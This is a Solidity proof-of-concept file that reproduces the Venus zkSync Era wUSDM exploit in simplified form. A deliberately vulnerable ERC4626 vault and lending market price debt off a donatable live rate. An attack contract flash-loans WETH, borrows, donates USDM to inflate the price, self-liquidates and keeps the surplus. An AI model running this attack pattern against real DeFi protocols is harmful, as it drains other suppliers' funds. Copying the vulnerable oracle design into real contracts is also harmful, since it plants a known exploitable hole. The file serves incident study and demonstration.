// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Standalone synthetic exploit for the EVM Playground, reproducing the Venus
// (zkSync Era) wUSDM donation -> oracle inflation -> self-liquidation drain.
// See Venus_ZKSync_exp.md for the full writeup and test/Venus_ZKSync_exp.sol
// for the real, historically-accurate PoC (which cannot execute here).
//
// WHY THIS FILE IS DIFFERENT FROM THE REAL POC (read before editing):
//
// On zkSync Era, EVERY contract touched by the real attack - WETH, USDM,
// wUSDM, vWETH, vUSDM, the Comptroller, even the Aave pool - is compiled to
// EraVM (zkEVM) bytecode, not standard EVM bytecode. Unlike the Renegade
// PoC (Arbitrum Stylus), where only ONE contract (the Stylus implementation)
// needed a 2-selector shim and 26 real ERC-20s + the rest of the chain were
// untouched, REAL forked state, here NOTHING is executable and NOTHING in the
// dumped state is usable: the committed anvil_state.json only captured 4
// unrelated accounts because the real zkSync fork reverted in setUp() before
// any meaningful state could be read (see output.txt).
//
// So this file does not "shim two selectors of one real contract" - it is a
// minimal, self-contained reimplementation of the RELEVANT slice of the whole
// mini-protocol (an ERC4626 vault + a two-market lending pool + a flash-loan
// pool), written in plain, ordinary Solidity, that reproduces the EXACT
// vulnerability mechanism described in Venus_ZKSync_exp.md:
//
//   1. wUSDM is an ERC4626 vault whose totalAssets() is the vault's raw USDM
//      token balance (openzeppelin ERC4626Upgradeable, unmodified) - so ANYONE
//      can inflate its share price with a plain USDM transfer (a donation).
//   2. The lending market prices wUSDM debt using that LIVE, donatable rate
//      with no TWAP/cap/pivot-fallback (mirrors ERC4626Oracle / ResilientOracle
//      with only the MAIN feed enabled, exactly as documented in the .md).
//   3. Liquidation is permissionless and un-gated against self-dealing, so an
//      attacker can borrow against real collateral, inflate the price of their
//      OWN debt asset, and then "liquidate" themselves at the inflated price -
//      extracting collateral value (funded by the market's other suppliers)
//      via the liquidation incentive, while abandoning the residual debt.
//
// Every economic parameter below (collateral factor, liquidation incentive,
// vault size, borrow amounts) is a ROUND NUMBER we chose ourselves to
// demonstrate this mechanism cleanly - NOT an attempt to replay the real
// zkSync chain's exact historical amounts (which is impossible: none of that
// chain's bytecode can execute in a plain EVM interpreter). The bug being
// demonstrated - a live, donatable ERC4626 rate feeding a liquidation seize
// calculation with no manipulation resistance - is identical to the real one.
//
// Simplifications made for a small, auditable shim (documented, not hidden):
//  - One combined "collateral market" (vWETH-equivalent) and one "debt market"
//    (vUSDM-equivalent) instead of a full Comptroller + N VToken deployment.
//  - No enterMarkets()/market-entry step: mint() directly tracks collateral.
//  - No close factor / multi-round liquidation loop: one liquidateBorrow call
//    demonstrates the same per-unit price-inflation-funded seize the real
//    attack repeated 35 times.
//  - Self-liquidation is allowed in this shim's debt market (the real Venus
//    Comptroller does not forbid it either - the real PoC's two-contract
//    target/helper split is bookkeeping, not a bypassed permission check).
//  - USDM is treated as a flat $1 non-rebasing ERC20 (the real donation
//    attack works identically regardless of USDM's rebase mechanics - the
//    bug is in wUSDM.totalAssets() == raw balance, not in USDM itself).

address constant WETH_ADDR = 0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91;
address constant USDM_ADDR = 0x7715c206A14Ac93Cb1A6c0316A6E5f8aD7c9Dc31;
address constant WUSDM_ADDR = 0xA900cbE7739c96D2B153a273953620A701d5442b;
address constant VWETH_ADDR = 0x1Fa916C27c7C2c4602124A14C77Dbb40a5FF1BE8;
address constant VUSDM_ADDR = 0x183dE3C349fCf546aAe925E1c7F364EA6FB4033c;
address constant AAVE_ADDR = 0x78e30497a3c7527d953c6B1E3541b021A98Ac43c;

uint256 constant PRICE_WETH_1E18 = 2000 ether; // fixed $2000/WETH oracle feed (unrelated to the bug)
uint256 constant CF_1E18 = 0.8 ether; // 80% collateral factor for WETH
uint256 constant INCENTIVE_1E18 = 1.5 ether; // 50% liquidation incentive (real Venus used 10%; we use a
    // larger, still-plausible figure purely so a single liquidateBorrow call demonstrates a clear net
    // profit without needing the real attack's 35-round loop)

interface IMiniToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IMiniWusdmVault {
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IMiniCollateralMarket {
    function mint(uint256 amount) external;
    function collateralOf(address user) external view returns (uint256);
    function seize(address liquidator, address borrower, uint256 seizeAmount) external;
}

interface IMiniDebtMarket {
    function borrow(uint256 amount) external;
    function liquidateBorrow(address borrower, uint256 repayAmount, address vTokenCollateral) external;
}

interface IMiniAavePool {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode)
        external;
}

interface IFlashLoanReceiver {
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool);
}

// Plain ERC20 shim, deployed (via codeOverrides, no constructor) at BOTH
// WETH_ADDR and USDM_ADDR - each address gets its own independent storage.
// storage layout: slot 0 = balanceOf, slot 1 = allowance.
contract MiniToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            allowance[from][msg.sender] = a - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }
}

// wUSDM: an ERC4626-style vault over USDM. Deployed at WUSDM_ADDR.
// storage layout: slot 0 = balanceOf (shares), slot 1 = allowance, slot 2 = totalSupply.
//
// *** THE BUG (mirrors ERC4626Oracle / ERC4626Upgradeable exactly): ***
// totalAssets() is the vault's LIVE, raw USDM token balance - anyone can move
// it with a plain USDM.transfer(vault, x) donation, with no shares minted and
// no resistance whatsoever. convertToAssets() (the value Venus's oracle reads
// every call, no TWAP/cap/pivot-fallback) moves in lockstep.
contract MiniWusdmVault {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function totalAssets() public view returns (uint256) {
        return IMiniToken(USDM_ADDR).balanceOf(address(this)); // <-- live, donatable raw balance
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 ts = totalSupply;
        if (ts == 0) return shares;
        return (shares * totalAssets()) / ts;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            allowance[from][msg.sender] = a - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    // ERC4626-style redeem: burn `shares` from `owner`, withdraw the
    // corresponding USDM to `receiver`. (Simplified: owner must be msg.sender,
    // no third-party allowance path needed for this PoC.)
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        require(msg.sender == owner, "redeem: not owner");
        assets = convertToAssets(shares);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        IMiniToken(USDM_ADDR).transfer(receiver, assets);
    }
}

// vWETH-equivalent: tracks WETH collateral. Deployed at VWETH_ADDR.
// storage layout: slot 0 = collateralOf.
contract MiniCollateralMarket {
    mapping(address => uint256) public collateralOf;

    function mint(uint256 amount) external {
        IMiniToken(WETH_ADDR).transferFrom(msg.sender, address(this), amount);
        collateralOf[msg.sender] += amount;
    }

    // Called only by the debt market during liquidation. Transfers real WETH
    // out of this market's pooled reserve (which includes both the borrower's
    // own deposit AND other suppliers' liquidity) to the liquidator - exactly
    // like a real Compound-V2-style vToken, where a supplier's token balance
    // is a claim on a SHARED pool, not a ring-fenced personal vault.
    function seize(address liquidator, address borrower, uint256 seizeAmount) external {
        require(msg.sender == VUSDM_ADDR, "seize: only debt market");
        uint256 bal = collateralOf[borrower];
        collateralOf[borrower] = seizeAmount > bal ? 0 : bal - seizeAmount;
        IMiniToken(WETH_ADDR).transfer(liquidator, seizeAmount);
    }
}

// vUSDM-equivalent: tracks wUSDM debt and prices it via the live wUSDM rate.
// Deployed at VUSDM_ADDR. storage layout: slot 0 = debtOf.
contract MiniDebtMarket {
    mapping(address => uint256) public debtOf;

    function _priceWusdm1e18() internal view returns (uint256) {
        // *** THE BUG, continued: the debt market prices wUSDM using the
        // vault's live convertToAssets(1e18) with no smoothing, cap, or
        // second oracle source - identical to ERC4626Oracle.getPrice(). ***
        return IMiniWusdmVault(WUSDM_ADDR).convertToAssets(1 ether); // USDM assumed pegged at $1
    }

    function _debtValueUsd(address user) internal view returns (uint256) {
        return (debtOf[user] * _priceWusdm1e18()) / 1 ether;
    }

    function _collateralPowerUsd(address user) internal view returns (uint256) {
        uint256 collateral = IMiniCollateralMarket(VWETH_ADDR).collateralOf(user);
        uint256 rawValue = (collateral * PRICE_WETH_1E18) / 1 ether;
        return (rawValue * CF_1E18) / 1 ether;
    }

    function borrow(uint256 amount) external {
        uint256 newDebtValue = ((debtOf[msg.sender] + amount) * _priceWusdm1e18()) / 1 ether;
        require(newDebtValue <= _collateralPowerUsd(msg.sender), "borrow: insufficient collateral");
        debtOf[msg.sender] += amount;
        IMiniToken(WUSDM_ADDR).transfer(msg.sender, amount);
    }

    function liquidateBorrow(address borrower, uint256 repayAmount, address vTokenCollateral) external {
        require(vTokenCollateral == VWETH_ADDR, "liquidate: bad collateral market");
        require(_debtValueUsd(borrower) > _collateralPowerUsd(borrower), "liquidate: position healthy");

        IMiniToken(WUSDM_ADDR).transferFrom(msg.sender, address(this), repayAmount);
        debtOf[borrower] -= repayAmount;

        uint256 priceWusdm = _priceWusdm1e18(); // <-- inflated by the attacker's donation, above
        uint256 repayValueUsd = (repayAmount * priceWusdm) / 1 ether;
        uint256 seizeValueUsd = (repayValueUsd * INCENTIVE_1E18) / 1 ether;
        uint256 seizeWeth = (seizeValueUsd * 1 ether) / PRICE_WETH_1E18;

        IMiniCollateralMarket(VWETH_ADDR).seize(msg.sender, borrower, seizeWeth);
    }
}

// Aave-equivalent flash-loan pool. Deployed at AAVE_ADDR.
contract MiniAavePool {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16)
        external
    {
        uint256 premium = amount / 100; // 1% flat fee
        IMiniToken(asset).transfer(receiverAddress, amount);
        require(
            IFlashLoanReceiver(receiverAddress).executeOperation(asset, amount, premium, msg.sender, params),
            "flashloan: executeOperation failed"
        );
        IMiniToken(asset).transferFrom(receiverAddress, address(this), amount + premium);
    }
}

// The attack itself: flash-loan WETH, post it as collateral, borrow wUSDM,
// redeem part of it back to USDM and DONATE the USDM into the vault (the
// exploit), then self-liquidate at the now-inflated wUSDM price to seize
// collateral funded by the market's other suppliers.
contract VenusZkSyncExploit {
    address internal immutable attacker;

    uint256 internal constant FLASH_AMOUNT = 1_000 ether;
    uint256 internal constant BORROW_AMOUNT = 1_599_000 ether; // debt value $1,599,000 @ $1/wUSDM: healthy
        // against 1,000 WETH * $2000 * 80% CF = $1,600,000 borrowing power
    uint256 internal constant REDEEM_SHARES = 400_000 ether; // redeemed to USDM and donated -> inflates
        // wUSDM price from $1.00 to $1.25 (vault totalAssets unchanged at 2,000,000, totalSupply drops
        // from 2,000,000 to 1,600,000 wUSDM shares)
    uint256 internal constant REPAY_AMOUNT = BORROW_AMOUNT - REDEEM_SHARES; // 1,199,000 wUSDM kept in
        // reserve, used to self-liquidate at the inflated price

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function attack() external {
        IMiniAavePool(AAVE_ADDR).flashLoanSimple(address(this), WETH_ADDR, FLASH_AMOUNT, "", 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == AAVE_ADDR, "callback: not Aave pool");
        require(asset == WETH_ADDR, "callback: unexpected asset");

        // 1. Post the flash-loaned WETH as collateral.
        IMiniToken(WETH_ADDR).approve(VWETH_ADDR, type(uint256).max);
        IMiniCollateralMarket(VWETH_ADDR).mint(amount);

        // 2. Borrow wUSDM against it (healthy at the pre-manipulation $1 price).
        IMiniDebtMarket(VUSDM_ADDR).borrow(BORROW_AMOUNT);

        // 3. Redeem part of the borrowed wUSDM back to USDM...
        IMiniWusdmVault(WUSDM_ADDR).redeem(REDEEM_SHARES, address(this), address(this));

        // 4. ...and DONATE it straight into the vault. No shares are minted,
        //    but totalAssets() jumps -> convertToAssets(1e18) jumps -> the
        //    oracle price of wUSDM jumps. THIS is the exploit.
        uint256 usdmBal = IMiniToken(USDM_ADDR).balanceOf(address(this));
        IMiniToken(USDM_ADDR).transfer(WUSDM_ADDR, usdmBal);

        // 5. The position is now massively undercollateralized at the
        //    inflated price. Self-liquidate: repay the reserved wUSDM and
        //    seize WETH collateral at the inflated price + incentive.
        IMiniToken(WUSDM_ADDR).approve(VUSDM_ADDR, REPAY_AMOUNT);
        IMiniDebtMarket(VUSDM_ADDR).liquidateBorrow(address(this), REPAY_AMOUNT, VWETH_ADDR);

        // 6. Repay the flash loan and keep the surplus WETH as profit. The
        //    remaining wUSDM debt (400,000 units) is simply abandoned - bad
        //    debt left for the market's suppliers, exactly like the real attack.
        uint256 repayment = amount + premium;
        uint256 finalWeth = IMiniToken(WETH_ADDR).balanceOf(address(this));
        uint256 profit = finalWeth - repayment;
        IMiniToken(WETH_ADDR).transfer(attacker, profit);
        IMiniToken(WETH_ADDR).approve(AAVE_ADDR, repayment);

        return true;
    }
}
